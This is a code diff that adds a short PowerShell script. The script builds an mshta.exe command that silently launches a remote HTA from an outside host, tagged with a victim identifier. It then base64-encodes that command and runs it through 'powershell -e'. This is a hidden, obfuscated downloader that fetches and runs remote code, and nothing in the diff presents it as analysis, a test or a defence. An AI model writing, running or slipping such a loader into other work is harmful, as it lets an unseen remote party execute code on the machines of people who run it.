@@ -1,0 +1,7 @@
+$uid = "'{uid}'"
+$script = @"
+C:\Windows\System32\mshta.exe "javascript:close((new ActiveXObject('Shell.Application')).ShellExecute('mshta.exe', 'https://ecs.rcsis.ir?uid=' + $uid + '&s=1', '', 'open', 0))"
+"@
+#echo $script
+$script = [Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($script))
+powershell -e $script
